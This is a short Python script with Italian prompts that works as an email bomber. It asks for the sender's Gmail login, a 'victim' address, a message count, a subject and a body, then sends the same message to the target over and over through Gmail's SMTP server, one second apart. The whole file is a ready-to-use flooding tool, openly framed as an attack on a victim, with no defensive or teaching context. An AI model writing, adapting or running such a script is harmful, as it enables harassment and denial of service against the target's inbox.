import smtplib
import time

EmailLogin = input("Inserisci l'email da cui inviare l'attacco: ")
PasswordLogin = input("Inserisci la password dell'email da cui inviare l'attacco: ")
EmailVittima = input("scegli l'email della vittima:  ")
Qnt = input("scegli la quantita di email da inviare:  ")

Sub = "Subject:"

oggetto = input("inserisci l'oggetto dell'email:  ")

oggetto = Sub + oggetto + "\n\n"

contenuto = input("inserisci il contenuto dell'email:  ")

messaggio = oggetto + contenuto

email = smtplib.SMTP("smtp.gmail.com", 587)
email.ehlo()

email.starttls()
email.login(EmailLogin, PasswordLogin)
for x in range(1, int(Qnt)):
    email.sendmail(EmailLogin, EmailVittima, messaggio)
    time.sleep(1)

email.quit()